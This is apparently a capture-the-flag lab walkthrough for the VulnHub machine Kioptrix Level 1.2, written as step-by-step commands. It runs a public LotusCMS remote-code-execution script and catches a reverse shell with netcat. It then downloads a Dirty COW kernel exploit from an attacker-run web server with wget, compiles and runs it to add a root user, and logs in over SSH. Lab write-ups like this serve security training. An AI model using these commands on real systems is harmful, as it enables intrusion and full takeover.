:::::::::::::::::::::::::::: page
# Kioptrix: Level 1.2 {#kioptrix-level-1.2 .title}

\

## 

## Kioptrix: Level 1.2

- **[Kioptrix: Level 1.2]{style="color:#237522;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/kioptrix-level-12-3,24/>

![](images/791-1.png)

- [Machine Setup]{style="color:#9141ac;"} :

1.  Now unrar the file .

<!-- -->

1.  Make a new machine in virtual box .

![](images/791-2.png) Click to finish .

1.  .vmdk file add in machine folder :

![](images/791-3.png)

1.  Now go to machine setting :
2.  Remove empty section from controller IDE .
3.  Click add hard disk .

![](images/791-4.png)

![](images/791-5.png)

- After select the file the click to choose .
- Network is bridge adapter .

1.  Start the machine .

![](images/791-6.png)

1.  [Network Scanning]{style="color:#9141ac;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/791-7.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.181
:::

![](images/791-8.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.181
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.181    
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.181
:::

![](images/791-9.png)

1.  [Web Enumeration]{style="color:#9141ac;"} :

- IP visit in browser : <http://192.168.2.181>

<!-- -->

- In port 80 go to login page we found a site "Proudly Powered by:
  LotusCMS" :

![](images/791-10.png) I decided to search for public exploits related
to LotusCMS.

- Search the LotusCMS version :

::: codebox
    searchsploit LotusCMS
:::

![](images/791-11.png)

1.  [Reverse Shell]{style="color:#9141ac;"} :

- LotusCMS exploit search in browser :

::: codebox
    https://github.com/Hood3dRob1n/LotusCMS-Exploit
:::

- Download the exploit :

::: codebox
    git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit
:::

![](images/791-12.png)

- Execute the .sh file :

::: codebox
    ./lotusRCE.sh 192.168.2.181 /
:::

- Start the reverse shell listener :

::: codebox
    nc -l -p 443 -vvv
:::

![](images/791-13.png) After select 1 then click enter .

- Get the shell :

![](images/791-14.png) But the shell is non-interactive .

- Upgrading to a Fully Interactive Shell :

::: codebox
    python -c 'import pty; pty.spawn("/bin/bash")'
:::

![](images/791-15.png)

1.  [SSH Access]{style="color:#9141ac;"} :

- Gathered system info :

::: codebox
    uname -a
:::

![](images/791-16.png)

- Searching for a local privilege escalation exploit :

::: codebox
    searchsploit Linux Kernel 2.6.24-24 privilege Escalation
:::

![](images/791-17.png)

- Then copy the exploit to new directory :

::: codebox
    mkdir /tmp/share
:::

- 

::: codebox
    cd /tmp/share
:::

- 

::: codebox
    searchsploit -m linux/local/40839.c
:::

![](images/791-18.png)

- Start the python server to file transfer in server :

::: codebox
    python -m http.server 8080
:::

![](images/791-19.png)

- Transferring the exploit file on the target :

::: codebox
    cd /tmp
:::

- 

::: codebox
    wget http://192.168.2.219:8080/40839.c
:::

![](images/791-20.png)

- Exploit source code compile :

::: codebox
    gcc 40839.c -o expo -lcrypt -lpthread
:::

- Permission on the file :

::: codebox
    chmod +x expo
:::

- Run the exploit :

::: codebox
    ./expo
:::

- It asked for a new password :

::: codebox
    12345
:::

![](images/791-21.png)

- It created a new root user :

::: codebox
    firefart:fi3LLch28IK7A:0:0:pwned:/root:/bin/bash
:::

- Make a ssh connection with the supported host key algorithm :

::: codebox
    ssh -oHostKeyAlgorithms=+ssh-rsa firefart@192.168.2.181
:::

![](images/791-22.png)
::::::::::::::::::::::::::::
